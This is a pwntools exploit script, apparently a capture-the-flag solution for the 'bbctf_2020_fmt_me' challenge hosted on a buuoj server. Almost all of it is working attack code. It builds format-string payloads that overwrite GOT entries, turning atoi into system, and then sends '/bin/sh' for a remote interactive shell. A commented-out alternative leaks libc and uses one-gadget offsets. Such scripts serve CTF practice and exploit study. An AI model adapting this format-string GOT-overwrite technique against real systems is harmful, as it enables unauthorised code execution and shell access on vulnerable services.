#!/usr/bin/env python3
#coding:utf-8

from pwn import *

#--------------------prepare------------------------
binary = './bbctf_2020_fmt_me_fixed'
libc_so = ""
host = "node4.buuoj.cn"
port = 25219
#---------------------------------------------------
elf = ELF(binary, checksec=False)
libc = ELF(libc_so, checksec=False) if libc_so and not elf.got else (not elf.got or elf.libc)
context(arch = elf.arch, os = 'linux')
if args.G:
    context.log_level = 'debug'
p = remote(host, port) if args.R else process(binary)

def attach(msg = ''):
    if args.R:return
    context(terminal=["tmux","splitw","-v"])
    gdb.attach(p, gdbscript=msg)
    dbg('go to gdb')
#---------------------short command-------------------
dbg = lambda msg='debug': info(f'[*]{msg}') if args.R else input(f"pid: {pidof(p)[0]} =>{msg}")
checkstr = lambda data:data if isinstance(data, bytes) else data.encode()
sl = lambda data: p.sendline(checkstr(data))
sd = lambda data: p.send(checkstr(data))
sa = lambda delimit, data: p.sendafter(checkstr(delimit), checkstr(data))
sla = lambda delimit, data: p.sendlineafter(checkstr(delimit), checkstr(data))
ru = lambda delimit, *args, **kwargs: p.recvuntil(checkstr(delimit), *args, **kwargs)
rl = lambda : p.recvline()
ra = lambda timeout=10 : p.recvall(timeout=timeout)
rcn = lambda number=4096,*args, **kwargs: p.recv(number,*args, **kwargs)
ss = lambda delimit, data: success(f'{delimit}: {data:#x}')
uu64 = lambda data:u64(checkstr(data).ljust(8, p8(0)))
uu32 = lambda data:u32(checkstr(data).ljust(4, p8(0)))
#---------------------PWN SPACE----------------------
system_addr = 0x401050
fini_arr = 0x403E08
start = 0x4010C0
main = 0x4011F7
get_int = 0x4011A6

#----------------method1-----------------------
# sla('Choice: ', '2')
# payload = fmtstr_payload(6, {
#         elf.got.system:start, 
#         elf.got.setvbuf:elf.plt.puts, 
#         elf.bss():elf.got.puts})
# sd(payload)


# puts_addr = uu64(ru(p8(0x7f))[-6:])
# libcbase = puts_addr - libc.sym.puts
# ss('puts address', puts_addr)
# ss('libcbase', libcbase)

# one = [0x4f322, 0x4f2c5, 0x10a38c]
# #sla('Choice: ', '2')
# sl('2')
# payload = fmtstr_payload(6, {elf.got.puts:one[0]+libcbase})
# sd(payload)

#-------------------method2-----------------------

ss('system plt', elf.plt.system)
sla('Choice: ', '2')
payload = fmtstr_payload(6, {elf.got.system:main, elf.got.atoi: elf.plt.system+6})
sd(payload)

sla('Choice: ', '/bin/sh\x00')

#--------INTERACTIVE----------------------------
p.interactive()
